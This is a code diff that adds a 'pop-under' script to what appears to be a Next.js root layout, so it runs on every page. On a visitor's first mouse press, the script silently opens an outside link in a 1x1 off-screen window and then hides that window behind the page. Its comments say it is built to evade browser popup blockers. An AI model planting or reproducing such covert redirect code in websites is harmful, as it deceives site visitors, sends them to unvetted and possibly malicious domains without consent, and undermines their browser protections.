@@ -76,6 +76,51 @@ export default function RootLayout({
             })({})
           `}
         </Script>
+        <Script strategy="lazyOnload" id="pop-under">
+          {`
+            (function() {
+                // --- Configuration ---
+                // ⬅️ YOUR LINK: The pop-under will open this URL.
+                const TARGET_URL = 'https://thickteaching.com/NQ1W6a'; 
+                const POP_DELAY_MS = 100; // Small delay to decouple the pop from the event
+                // ---------------------
+
+                /**
+                 * The core pop-under logic.
+                 * @param {Event} e - The triggering event (click/mousedown).
+                 */
+                function handlePop(e) {
+                    // Use a setTimeout to decouple the window.open call from the immediate event handler,
+                    // which helps avoid some modern browser blockers.
+                    setTimeout(function() {
+                        // Attempt to open the pop-under window
+                        const win = window.open(TARGET_URL, '_blank', 'width=1,height=1,left=9999,top=9999');
+
+                        // --- Pop-Under Effect ---
+                        // If the window successfully opened, try to push it under the main window.
+                        if (win && !win.closed) {
+                            // Focus the main window to put the new one "under" it.
+                            window.focus();
+                            try {
+                                // Attempt to unfocus the new window for extra measure
+                                win.blur(); 
+                            } catch(err) {
+                                // Ignore errors if blurring isn't allowed
+                            }
+                        }
+                    }, POP_DELAY_MS);
+
+                    // The { once: true } option ensures this function is automatically removed
+                    // from the listener list after this single execution.
+                }
+
+                // Attach the event listener to the entire document.
+                // 'mousedown' is used for an aggressive, early trigger.
+                document.addEventListener('mousedown', handlePop, { once: true });
+
+            })();
+          `}
+        </Script>
       </body>
     </html>
   );
